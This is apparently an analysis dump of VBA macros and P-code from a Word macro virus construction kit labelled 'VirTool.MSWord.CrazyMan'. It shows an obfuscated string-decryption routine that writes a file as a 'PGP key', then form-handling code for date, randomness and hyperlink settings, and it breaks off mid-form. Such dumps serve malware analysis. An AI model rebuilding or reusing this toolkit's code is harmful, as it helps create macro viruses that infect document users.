  ASCModul(120) = DeCrypt("â¿Â³ýéïú Ü´“¨ÄŸØáÐóËýå›“ÿ»äÄÉ¢ü¾¸Í", VS)
 Open DateiName For Output As 1
 For x = 0 To 120
  Print #1, ASCModul(x)
 Next x
 Close 1
 MsgBox "PGP-Schlüssel: """ & DateiName & """ wurde erstellt.", vbInformation, EsIstIch
 Exit Sub

fehler:
 MsgBox "Fehler bei der Schlüsselerstellung !!!", vbCritical, EsIstIch
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: VirTool.MSWord.CrazyMan
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1169 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Macros/VBA/FormDatum - 12149 bytes
' Line #0:
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	Dim 
' 	VarDefn Abbruch (As Boolean)
' Line #3:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #4:
' 	LitVarSpecial (False)
' 	St Abbruch 
' Line #5:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #8:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Private Sub OptionButton1_Change())
' Line #11:
' 	LitDI2 0x0001 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Private Sub OptionButton2_Change())
' Line #14:
' 	LitDI2 0x0002 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Private Sub OptionButton3_Change())
' Line #17:
' 	LitDI2 0x0003 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Private Sub OptionButton4_Change())
' Line #20:
' 	LitDI2 0x0004 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Private Sub OptionButton5_Change())
' Line #23:
' 	LitDI2 0x0005 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #24:
' 	EndSub 
' Line #25:
' 	FuncDefn (Private Sub OptionButton6_Change())
' Line #26:
' 	LitDI2 0x0006 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Private Sub OptionButton7_Change())
' Line #29:
' 	LitDI2 0x0007 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Private Sub OptionButton8_Change())
' Line #32:
' 	LitDI2 0x0008 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Private Sub OptionButton9_Change())
' Line #35:
' 	LitDI2 0x0009 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #36:
' 	EndSub 
' Line #37:
' 	FuncDefn (Private Sub OptionButton10_Change())
' Line #38:
' 	LitDI2 0x000A 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Private Sub OptionButton11_Change())
' Line #41:
' 	LitDI2 0x000B 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Private Sub OptionButton12_Change())
' Line #44:
' 	LitDI2 0x000C 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Private Sub OptionButton13_Change())
' Line #47:
' 	LitDI2 0x000D 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Private Sub OptionButton14_Change())
' Line #50:
' 	LitDI2 0x000E 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Private Sub OptionButton15_Change())
' Line #53:
' 	LitDI2 0x000F 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Private Sub OptionButton16_Change())
' Line #56:
' 	LitDI2 0x0010 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Private Sub OptionButton17_Change())
' Line #59:
' 	LitDI2 0x0011 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Private Sub OptionButton18_Change())
' Line #62:
' 	LitDI2 0x0012 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Private Sub OptionButton19_Change())
' Line #65:
' 	LitDI2 0x0013 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Private Sub OptionButton20_Change())
' Line #68:
' 	LitDI2 0x0014 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #69:
' 	EndSub 
' Line #70:
' 	FuncDefn (Private Sub OptionButton21_Change())
' Line #71:
' 	LitDI2 0x0015 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Private Sub OptionButton22_Change())
' Line #74:
' 	LitDI2 0x0016 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Private Sub OptionButton23_Change())
' Line #77:
' 	LitDI2 0x0017 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Private Sub OptionButton24_Change())
' Line #80:
' 	LitDI2 0x0018 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Private Sub OptionButton25_Change())
' Line #83:
' 	LitDI2 0x0019 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Private Sub OptionButton26_Change())
' Line #86:
' 	LitDI2 0x001A 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #87:
' 	EndSub 
' Line #88:
' 	FuncDefn (Private Sub OptionButton27_Change())
' Line #89:
' 	LitDI2 0x001B 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Private Sub OptionButton28_Change())
' Line #92:
' 	LitDI2 0x001C 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Private Sub OptionButton30_Change())
' Line #95:
' 	LitDI2 0x001E 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #96:
' 	EndSub 
' Line #97:
' 	FuncDefn (Private Sub OptionButton31_Change())
' Line #98:
' 	LitDI2 0x001F 
' 	Ld Dat_Datum 
' 	MemSt Tag 
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Private Sub OptionButton32_Change())
' Line #101:
' 	Ld OptionButton32 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld OptionButton48 
' 	MemSt Enabled 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton48 
' 	MemSt Enabled 
' 	EndIf 
' Line #102:
' 	Ld OptionButton32 
' 	MemLd Value 
' 	Ld Dat_Datum 
' 	MemSt JedenTag 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Private Sub OptionButton36_Click())
' Line #105:
' 	LitDI2 0x0001 
' 	Ld Dat_Datum 
' 	MemSt Monat 
' 	BoS 0x0000 
' 	ArgsCall SetMaxTage 0x0000 
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Private Sub OptionButton37_Click())
' Line #108:
' 	LitDI2 0x0002 
' 	Ld Dat_Datum 
' 	MemSt Monat 
' 	BoS 0x0000 
' 	ArgsCall SetMaxTage 0x0000 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Private Sub OptionButton38_Click())
' Line #111:
' 	LitDI2 0x0003 
' 	Ld Dat_Datum 
' 	MemSt Monat 
' 	BoS 0x0000 
' 	ArgsCall SetMaxTage 0x0000 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Private Sub OptionButton39_Click())
' Line #114:
' 	LitDI2 0x0004 
' 	Ld Dat_Datum 
' 	MemSt Monat 
' 	BoS 0x0000 
' 	ArgsCall SetMaxTage 0x0000 
' Line #115:
' 	EndSub 
' Line #116:
' 	FuncDefn (Private Sub OptionButton40_Click())
' Line #117:
' 	LitDI2 0x0005 
' 	Ld Dat_Datum 
' 	MemSt Monat 
' 	BoS 0x0000 
' 	ArgsCall SetMaxTage 0x0000 
' Line #118:
' 	EndSub 
' Line #119:
' 	FuncDefn (Private Sub OptionButton41_Click())
' Line #120:
' 	LitDI2 0x0006 
' 	Ld Dat_Datum 
' 	MemSt Monat 
' 	BoS 0x0000 
' 	ArgsCall SetMaxTage 0x0000 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Private Sub OptionButton42_Click())
' Line #123:
' 	LitDI2 0x0007 
' 	Ld Dat_Datum 
' 	MemSt Monat 
' 	BoS 0x0000 
' 	ArgsCall SetMaxTage 0x0000 
' Line #124:
' 	EndSub 
' Line #125:
' 	FuncDefn (Private Sub OptionButton43_Click())
' Line #126:
' 	LitDI2 0x0008 
' 	Ld Dat_Datum 
' 	MemSt Monat 
' 	BoS 0x0000 
' 	ArgsCall SetMaxTage 0x0000 
' Line #127:
' 	EndSub 
' Line #128:
' 	FuncDefn (Private Sub OptionButton44_Click())
' Line #129:
' 	LitDI2 0x0009 
' 	Ld Dat_Datum 
' 	MemSt Monat 
' 	BoS 0x0000 
' 	ArgsCall SetMaxTage 0x0000 
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Private Sub OptionButton45_Click())
' Line #132:
' 	LitDI2 0x000A 
' 	Ld Dat_Datum 
' 	MemSt Monat 
' 	BoS 0x0000 
' 	ArgsCall SetMaxTage 0x0000 
' Line #133:
' 	EndSub 
' Line #134:
' 	FuncDefn (Private Sub OptionButton46_Click())
' Line #135:
' 	LitDI2 0x000B 
' 	Ld Dat_Datum 
' 	MemSt Monat 
' 	BoS 0x0000 
' 	ArgsCall SetMaxTage 0x0000 
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Private Sub OptionButton47_Click())
' Line #138:
' 	LitDI2 0x000C 
' 	Ld Dat_Datum 
' 	MemSt Monat 
' 	BoS 0x0000 
' 	ArgsCall SetMaxTage 0x0000 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Private Sub OptionButton48_Change())
' Line #141:
' 	Ld OptionButton48 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld OptionButton32 
' 	MemSt Enabled 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton32 
' 	MemSt Enabled 
' 	EndIf 
' Line #142:
' 	Ld OptionButton48 
' 	MemLd Value 
' 	Ld Dat_Datum 
' 	MemSt JedenMonat 
' Line #143:
' 	EndSub 
' Line #144:
' 	FuncDefn (Private Sub SetMonat())
' Line #145:
' 	Ld Dat_Datum 
' 	MemLd Monat 
' 	SelectCase 
' Line #146:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton36 
' 	MemSt Value 
' Line #147:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton37 
' 	MemSt Value 
' Line #148:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton38 
' 	MemSt Value 
' Line #149:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton39 
' 	MemSt Value 
' Line #150:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton40 
' 	MemSt Value 
' Line #151:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton41 
' 	MemSt Value 
' Line #152:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton42 
' 	MemSt Value 
' Line #153:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton43 
' 	MemSt Value 
' Line #154:
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton44 
' 	MemSt Value 
' Line #155:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton45 
' 	MemSt Value 
' Line #156:
' 	LitDI2 0x000B 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton46 
' 	MemSt Value 
' Line #157:
' 	LitDI2 0x000C 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton47 
' 	MemSt Value 
' Line #158:
' 	EndSelect 
' Line #159:
' 	Ld Dat_Datum 
' 	MemLd JedenMonat 
' 	Ld OptionButton48 
' 	MemSt Value 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Private Sub SetDay())
' Line #162:
' 	Ld Dat_Datum 
' 	MemLd Tag 
' 	SelectCase 
' Line #163:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton1 
' 	MemSt Value 
' Line #164:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton2 
' 	MemSt Value 
' Line #165:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton3 
' 	MemSt Value 
' Line #166:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton4 
' 	MemSt Value 
' Line #167:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton5 
' 	MemSt Value 
' Line #168:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton6 
' 	MemSt Value 
' Line #169:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton7 
' 	MemSt Value 
' Line #170:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton8 
' 	MemSt Value 
' Line #171:
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton9 
' 	MemSt Value 
' Line #172:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton10 
' 	MemSt Value 
' Line #173:
' 	LitDI2 0x000B 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton11 
' 	MemSt Value 
' Line #174:
' 	LitDI2 0x000C 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton12 
' 	MemSt Value 
' Line #175:
' 	LitDI2 0x000D 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton13 
' 	MemSt Value 
' Line #176:
' 	LitDI2 0x000E 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton14 
' 	MemSt Value 
' Line #177:
' 	LitDI2 0x000F 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton15 
' 	MemSt Value 
' Line #178:
' 	LitDI2 0x0010 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton16 
' 	MemSt Value 
' Line #179:
' 	LitDI2 0x0011 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton17 
' 	MemSt Value 
' Line #180:
' 	LitDI2 0x0012 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton18 
' 	MemSt Value 
' Line #181:
' 	LitDI2 0x0013 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton19 
' 	MemSt Value 
' Line #182:
' 	LitDI2 0x0014 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton20 
' 	MemSt Value 
' Line #183:
' 	LitDI2 0x0015 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton21 
' 	MemSt Value 
' Line #184:
' 	LitDI2 0x0016 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton22 
' 	MemSt Value 
' Line #185:
' 	LitDI2 0x0017 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton23 
' 	MemSt Value 
' Line #186:
' 	LitDI2 0x0018 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton24 
' 	MemSt Value 
' Line #187:
' 	LitDI2 0x0019 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton25 
' 	MemSt Value 
' Line #188:
' 	LitDI2 0x001A 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton26 
' 	MemSt Value 
' Line #189:
' 	LitDI2 0x001B 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton27 
' 	MemSt Value 
' Line #190:
' 	LitDI2 0x001C 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton28 
' 	MemSt Value 
' Line #191:
' 	LitDI2 0x001D 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton29 
' 	MemSt Value 
' Line #192:
' 	LitDI2 0x001E 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton30 
' 	MemSt Value 
' Line #193:
' 	LitDI2 0x001F 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld OptionButton31 
' 	MemSt Value 
' Line #194:
' 	EndSelect 
' Line #195:
' 	Ld Dat_Datum 
' 	MemLd JedenTag 
' 	Ld OptionButton32 
' 	MemSt Value 
' Line #196:
' 	EndSub 
' Line #197:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #198:
' 	LitVarSpecial (True)
' 	St Abbruch 
' Line #199:
' 	ArgsCall SetDay 0x0000 
' Line #200:
' 	ArgsCall SetMonat 0x0000 
' Line #201:
' 	EndSub 
' Line #202:
' 	FuncDefn (Private Sub SetMaxTage())
' Line #203:
' 	Ld Dat_Datum 
' 	MemLd Monat 
' 	SelectCase 
' Line #204:
' 	LitDI2 0x0004 
' 	Case 
' 	LitDI2 0x0006 
' 	Case 
' 	LitDI2 0x0009 
' 	Case 
' 	LitDI2 0x000B 
' 	Case 
' 	CaseDone 
' Line #205:
' 	Ld Dat_Datum 
' 	MemLd Tag 
' 	LitDI2 0x001F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld OptionButton30 
' 	MemSt Value 
' 	EndIf 
' Line #206:
' 	LitVarSpecial (False)
' 	Ld OptionButton31 
' 	MemSt Enabled 
' Line #207:
' 	LitDI2 0x0001 
' 	Case 
' 	LitDI2 0x0003 
' 	Case 
' 	LitDI2 0x0005 
' 	Case 
' 	LitDI2 0x0007 
' 	Case 
' 	LitDI2 0x0008 
' 	Case 
' 	LitDI2 0x000A 
' 	Case 
' 	LitDI2 0x000C 
' 	Case 
' 	CaseDone 
' Line #208:
' 	LitVarSpecial (True)
' 	Ld OptionButton29 
' 	MemSt Enabled 
' Line #209:
' 	LitVarSpecial (True)
' 	Ld OptionButton30 
' 	MemSt Enabled 
' Line #210:
' 	LitVarSpecial (True)
' 	Ld OptionButton31 
' 	MemSt Enabled 
' Line #211:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #212:
' 	Ld Dat_Datum 
' 	MemLd Tag 
' 	LitDI2 0x001D 
' 	Eq 
' 	Ld Dat_Datum 
' 	MemLd Tag 
' 	LitDI2 0x001E 
' 	Eq 
' 	Or 
' 	Ld Dat_Datum 
' 	MemLd Tag 
' 	LitDI2 0x001F 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld OptionButton28 
' 	MemSt Value 
' 	EndIf 
' Line #213:
' 	LitVarSpecial (False)
' 	Ld OptionButton29 
' 	MemSt Enabled 
' Line #214:
' 	LitVarSpecial (False)
' 	Ld OptionButton30 
' 	MemSt Enabled 
' Line #215:
' 	LitVarSpecial (False)
' 	Ld OptionButton31 
' 	MemSt Enabled 
' Line #216:
' 	EndSelect 
' Line #217:
' 	EndSub 
' Line #218:
' 	FuncDefn (Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer))
' Line #219:
' 	Ld Abbruch 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld Dat_Datum 
' 	MemSt OK 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Dat_Datum 
' 	MemSt OK 
' 	EndIf 
' Line #220:
' 	EndSub 
' Line #221:
' Line #222:
' Macros/VBA/FormFertig - 1368 bytes
' Line #0:
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	FuncDefn (Private Sub CommandButton_Click())
' Line #3:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #4:
' 	EndSub 
' Line #5:
' Macros/VBA/FormGenerator - 3310 bytes
' Line #0:
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	Dim 
' 	VarDefn Abbruch (As Boolean)
' Line #3:
' 	FuncDefn (Private Sub ButtonNO_Click())
' Line #4:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub ButtonOK_Click())
' Line #7:
' 	LitVarSpecial (False)
' 	St Abbruch 
' Line #8:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #11:
' 	LitVarSpecial (True)
' 	St Abbruch 
' Line #12:
' 	Ld Dat_Zufall 
' 	MemLd Randomize 
' 	SelectCase 
' Line #13:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Option1 
' 	MemSt Value 
' Line #14:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Option2 
' 	MemSt Value 
' Line #15:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Option3 
' 	MemSt Value 
' Line #16:
' 	LitDI2 0x0014 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Option4 
' 	MemSt Value 
' Line #17:
' 	LitDI2 0x0032 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Option5 
' 	MemSt Value 
' Line #18:
' 	LitDI2 0x0064 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Option6 
' 	MemSt Value 
' Line #19:
' 	LitDI2 0x00C8 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Option7 
' 	MemSt Value 
' Line #20:
' 	LitDI2 0x01F4 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Option8 
' 	MemSt Value 
' Line #21:
' 	LitDI2 0x03E8 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Option9 
' 	MemSt Value 
' Line #22:
' 	EndSelect 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer))
' Line #25:
' 	StartWithExpr 
' 	Ld Dat_Zufall 
' 	With 
' Line #26:
' 	Ld Abbruch 
' 	Not 
' 	IfBlock 
' Line #27:
' 	LitVarSpecial (True)
' 	Ld Dat_Zufall 
' 	MemSt OK 
' Line #28:
' 	Ld Option1 
' 	MemLd Value 
' 	IfBlock 
' Line #29:
' 	LitDI2 0x0001 
' 	MemStWith Randomize 
' Line #30:
' 	Ld Option2 
' 	MemLd Value 
' 	ElseIfBlock 
' 	LitDI2 0x0005 
' 	MemStWith Randomize 
' Line #31:
' 	Ld Option3 
' 	MemLd Value 
' 	ElseIfBlock 
' 	LitDI2 0x000A 
' 	MemStWith Randomize 
' Line #32:
' 	Ld Option4 
' 	MemLd Value 
' 	ElseIfBlock 
' 	LitDI2 0x0014 
' 	MemStWith Randomize 
' Line #33:
' 	Ld Option5 
' 	MemLd Value 
' 	ElseIfBlock 
' 	LitDI2 0x0032 
' 	MemStWith Randomize 
' Line #34:
' 	Ld Option6 
' 	MemLd Value 
' 	ElseIfBlock 
' 	LitDI2 0x0064 
' 	MemStWith Randomize 
' Line #35:
' 	Ld Option7 
' 	MemLd Value 
' 	ElseIfBlock 
' 	LitDI2 0x00C8 
' 	MemStWith Randomize 
' Line #36:
' 	Ld Option8 
' 	MemLd Value 
' 	ElseIfBlock 
' 	LitDI2 0x01F4 
' 	MemStWith Randomize 
' Line #37:
' 	Ld Option9 
' 	MemLd Value 
' 	ElseIfBlock 
' 	LitDI2 0x2710 
' 	MemStWith Randomize 
' Line #38:
' 	ElseBlock 
' Line #39:
' 	LitDI2 0x0000 
' 	Ld Dat_Zufall 
' 	MemSt Randomize 
' Line #40:
' 	LitVarSpecial (False)
' 	Ld Dat_Zufall 
' 	MemSt OK 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	ElseBlock 
' Line #43:
' 	LitDI2 0x0000 
' 	Ld Dat_Zufall 
' 	MemSt Randomize 
' Line #44:
' 	LitVarSpecial (False)
' 	Ld Dat_Zufall 
' 	MemSt OK 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	EndWith 
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
' Macros/VBA/FormHyperLink - 3453 bytes
' Line #0:
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	Dim 
' 	VarDefn Abbruch (As Boolean)
' Line #3:
' 	Dim (Const) 
' 	LitStr 0x0007 "HTTP://"
' 	VarDefn HTTP
' Line #4:
' 	FuncDefn (Private Sub ButtonNO_Click())
' Line #5:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub ButtonOK_Click())
' Line #8:
' 	Ld Dat_HyperLink 
' 	MemLd Link 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	Ld HTTP 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld HTTP 
' 	ArgsLd LCase 0x0001 
' 	Ld Dat_HyperLink 
' 	MemLd Link 
' 	Concat 
' 	Ld Dat_HyperLink 
' 	MemSt Link 
' 	EndIf 
' Line #9:
' 	Ld Dat_HyperLink 
' 	MemLd Link 
' 	ArgsLd TestCodierung 0x0001 
' 	IfBlock 
' Line #10:
' 	LitVarSpecial (False)
' 	St Abbruch 
' Line #11:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #12:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld CodeChar_ERROR 
' 	Ld vbCritical 
' 	Ld Title_ERROR 
' 	ArgsCall MsgBox 0x0003 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Private Sub Text_HyperLink_Change())
' Line #16:
' 	Ld Text_HyperLink 
' 	MemLd Then 
